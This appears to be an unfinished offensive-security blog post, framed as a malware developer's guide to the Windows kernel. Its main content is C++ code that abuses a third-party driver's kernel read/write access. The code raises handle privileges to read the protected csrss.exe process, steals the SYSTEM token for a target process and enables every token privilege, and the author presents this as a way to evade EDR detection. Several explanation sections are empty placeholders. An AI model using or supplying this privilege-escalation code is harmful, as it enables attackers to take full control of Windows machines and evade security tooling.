---
title: "nocking on Ring 0: A Malware Dev's Guide to the Windows Kernel — Part 02"
date: 2025-06-09 19:45:00 +0000
categories: [Red Team, windows internal]
tags: [windows-internals,malware-dev, kernel, driver, privilege-escalation ]
description: ""
---


_------------------------------------------------------------------_------
 
    search for : token stealing, etw silencing, privilege manipulations

_----------------------------------------------------------------____----------


>hi i am  Zane Bilal , a computer science student and an adventurer in the offensive side of cybersecurity.\
> in the world of malware, exploit development and low-level in general, its important to understand how things are build and how they work, for this i write this blog to discover the important parts needed to be understood by any security researcher , the kernel part from the windows operating system



# Handles :
> handles can have privileges , they provide access control to resources , is an index in the handle table , the  stored value  in the EPROCESS structure called objectTable is a pointer to a handle table of type Handle_Table, this structure has table_code field which points to an array of handles

## handles under the debugger

* some explanation and images taken from the windbg

## why we care 
> as said before , handles has privileges , so if we try to read or write to a protected process memory like lssas or csrss using our process the operation will fail unless we elivate our process privileged but this is a little bit suspicious , so we can just elevate the privilege of the handle that refer to the target object ( process, file ...etc ) se using this method we will reduce the chance of being catted by EDR's 
> let's take an example of trying reading the first two bytes of  the csrss.exe process from its memory , as we can see in the image bellow that this process is hat the light protection level which means this is protected by the system, no read or write to memory region, you can not terminate this process ...etc , in other words you can do nothing  to this process, but in our implementation below, we will break this briar and we will read some bytes from this process, read the code below:

```cpp

#include <windows.h>

BOOL SetHandlePrivs(HANDLE Device, int tPID, DWORD64 HandleID, DWORD Privs) {

	// 1. Get HANDLE_TABLE_ENTRY address of a specified handle
	DWORD64 HandleEntryAddress = 0;
	if (!GetHandleEntryFromHandle(Device, tPID, HandleID, &HandleEntryAddress))
		return FALSE;
	printf("[+] Target handle table entry @ 0x%p\n", HandleEntryAddress);	

	// 2. Set new privileges on the handle
	printf("[+] Assigning new privileges (0x%x) to target handle...", Privs);
	if (!TDIWriteKernel32(Device, HandleEntryAddress + 0x8, Privs)) {
		printf("failed.\n");
		return FALSE;
	}
	printf("done.\n");	

	return TRUE;
}

int main(int argc, char* argv[]) {

	int ret = -1;

	// get object offsets for the running Windows version
	if (!g_ObjOffsets.Ready)
		if (!GetWinOffsets()) {
			printf("[!] Error getting Windows offsets!\n");
			return ret;
		}

	// load the driver
	if (!LoadDriver()) {
		printf("[!] Driver could not be loaded! Exiting...\n");
		return ret;
	}
	
	// get access to the 3rd party driver
	HANDLE Device = TDIOpenDevice();
	if (Device == INVALID_HANDLE_VALUE) {
		printf("[!] Unable to get a device handle\n");
		goto cleanup;
	}
	printf("[+] Device opened\n");

	DWORD64 Obj = 0;
	if (!GetObjectFromHandle(Device, TargetPID, HandleID, &Obj)) {
		printf("[!] Error occured. Exiting...\n");
		goto cleanup;
	}
	printf("[+] Object @ %llx\n", Obj);
	
	
	// 1. Lookup for csrss.exe PID
	int pid = 0;
	if (!(pid = FindTarget("csrss.exe"))) {
		printf("[!] csrss.exe not found. Ciao!\n");
		goto cleanup;
	}
	printf("[+] Found csrss.exe PID = %d\n", pid);
	
	// 2. Open handle to csrss.exe for minimal rights - query_limited_information
	HANDLE TargetHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
	if (TargetHandle == NULL) {
		printf("[!] Could not open csrss.exe. Ciao!\n");
		goto cleanup;		
	}
	printf("[+] Handle: 0x%x\n", TargetHandle);
	
	// 3. try to read process memory (ex. first 2 bytes of ntdll.dll)
	BYTE data[2] = { 0 };
	char * ntdll = (char *) LoadLibrary("ntdll.dll");
	if (!ReadProcessMemory(TargetHandle, ntdll, &data, 2, NULL)) 
		printf("[!] First read attempt FAILED!\n\n");
	
	// 4. raise the handle privs
	if (!SetHandlePrivs(Device, GetCurrentProcessId(), (DWORD64) TargetHandle, HANDLE_FULL_PRIVS)) {
		printf("[!] Error occured. Exiting...\n");
		goto cleanup;
	}	
	getchar();
	
	// 5. try to read again
	if (!ReadProcessMemory(TargetHandle, ntdll, &data, 2, NULL)) 
		printf("[!] Second read attempt FAILED!\n");
	else
		printf("[*] Second read attempt SUCCESSFUL! Data: [0x%.1X%.1X] (%c%c)\n", data[0], data[1], data[0], data[1]);
	
	// Cleanup
	CloseHandle(TargetHandle);
	ret = 0;

cleanup:
	CloseHandle(Device);
	UnLoadDriver();
	return ret;
}

```
> * some code explanation and some references of the used function and some useful blogs

# Tokens 

> definition

## handles under the debugger


## why we care 

 
### Token Stealing 

###### Exchanging our process token withe system token
> small definition : changing the token of a process that is limited in its privileges to the system authority toekn that has full privileges on the system

> technique explication : the first step we need to find the token value of the system process and replace it with the token of our process in its EPROCESS structure   with preserving the reference_counte of our process otherwise we get blue-screen
* insert images from windbg

> code implementation
- the implementation is easy , the first step we need to find the token value of the system process and replace it with the token of our process in its EPROCESS structure 
 
```cpp
 
	BOOL Elevate2System(HANDLE Device, int tPID) {

	// 1. Determine which Windows version we're running on
	if (!g_ObjOffsets.Ready)
		if (!GetWinOffsets()) {
			printf("[!] Error getting Windows offsets!\n");
			return FALSE;
		}	

	// 2. Get address of System(4) EPROCESS object
	DWORD64 SystemEproc = NULL;
	if (!GetSystemEproc(&SystemEproc))
		return FALSE;
	printf("[+] System(4) EPROCESS address: %p\n", SystemEproc);

	// 3. Get target process EPROCESS address
	DWORD64 TargetProcessAddress = NULL;
	if (!GetEprocByPid(Device, tPID, &TargetProcessAddress))
		return FALSE;	
	printf("[+] Target EPROCESS address: %p\n", TargetProcessAddress);

	// 4. Get token object of System(4) process
	DWORD64 SystemToken = 0;
	if (!TDIReadKernel64(Device, SystemEproc + g_ObjOffsets.EPROC_Token, &SystemToken))
		return FALSE;
	SystemToken = SystemToken & ~0xf;
	printf("[+] System(4) process token: %p\n", SystemToken);
	
	// 5. Get target process token
	DWORD64 TargetToken = 0;
	if (!TDIReadKernel64(Device, TargetProcessAddress + g_ObjOffsets.EPROC_Token, &TargetToken))
		return FALSE;
	DWORD64 CurrentProcTokenRefCount = TargetToken & 0xf;
	printf("[+] Target process token: %p\n", TargetToken & ~0xf);

	// 6. Copy System(4) token address to target process
	printf("[+] Assigning SYSTEM token to target process...");
	if (!TDIWriteKernel64(Device, TargetProcessAddress + g_ObjOffsets.EPROC_Token, CurrentProcTokenRefCount | SystemToken)) {
		printf("failed.\n");
		return FALSE;
	}
	printf("done.\n");
	
	return TRUE;
}

```

> code explanation


###### Setting privileges to our Token 

> setting priviledges from the TOKEN structure by changing the value in the privileges process , setting the present bits and enabled bits to al f's in the TOKEN structure, we keep the same user but with more high powerful privileges

> code implementation: 

```cpp

BOOL GetTokenByPID(HANDLE Device, int tPID, DWORD64 * Token) {

	// 1. Determine which Windows version we're running on
	if (!g_ObjOffsets.Ready)
		if (!GetWinOffsets()) {
			printf("[!] Error getting Windows offsets!\n");
			return FALSE;
		}	
	
	// 2. Get target process EPROCESS address
	DWORD64 TargetProcessAddress = NULL;
	if (!GetEprocByPid(Device, tPID, &TargetProcessAddress))
		return FALSE;	
	printf("[+] Target EPROCESS address: %p\n", TargetProcessAddress);

	// 3. Get target process token
	DWORD64 TargetToken = 0;
	if (!TDIReadKernel64(Device, TargetProcessAddress + g_ObjOffsets.EPROC_Token, &TargetToken))
		return FALSE;
	TargetToken = TargetToken & ~0xf;
	printf("[+] Target process token: %p\n", TargetToken);

	*Token = TargetToken;	
	return TRUE;
}


BOOL SetTokenHighPrivs(HANDLE Device, int tPID) {

	// 1. Get target process token
	DWORD64 TargetToken = 0;
	if (!GetTokenByPID(Device, tPID, &TargetToken))
		return FALSE;
	
	// 2. Get current privileges
	/* struct _SEP_TOKEN_PRIVILEGES {
		ULONGLONG Present;				//0x0
		ULONGLONG Enabled;				//0x8
		ULONGLONG EnabledByDefault;		//0x10
	}; */
	DWORD64 TargetPrivsPresent = 0;
	DWORD64 TargetPrivsEnabled = 0;
	if (!TDIReadKernel64(Device, TargetToken + TOKEN_PRIVS_OFFSET, &TargetPrivsPresent) ||
		!TDIReadKernel64(Device, TargetToken + TOKEN_PRIVS_OFFSET + 0x8, &TargetPrivsEnabled))
		return FALSE;
	printf("[+] Target process privs: present=0x%llx | enabled=0x%llx\n", TargetPrivsPresent, TargetPrivsEnabled);

	// 3. Assign max privs to target process
	printf("[+] Enabling high privs on target process...");
	if (!TDIWriteKernel64(Device, TargetToken + TOKEN_PRIVS_OFFSET, TOKEN_HIGH_PRIVS) ||
		!TDIWriteKernel64(Device, TargetToken + TOKEN_PRIVS_OFFSET + 0x8, TOKEN_HIGH_PRIVS) ) {
		printf("failed.\n");
		return FALSE;
	}
	printf("done.\n");
	printf("[+] Target process privs: present=0x%llx | enabled=0x%llx\n", TOKEN_HIGH_PRIVS, TOKEN_HIGH_PRIVS);
	
	return TRUE;
}

```

> code explication 



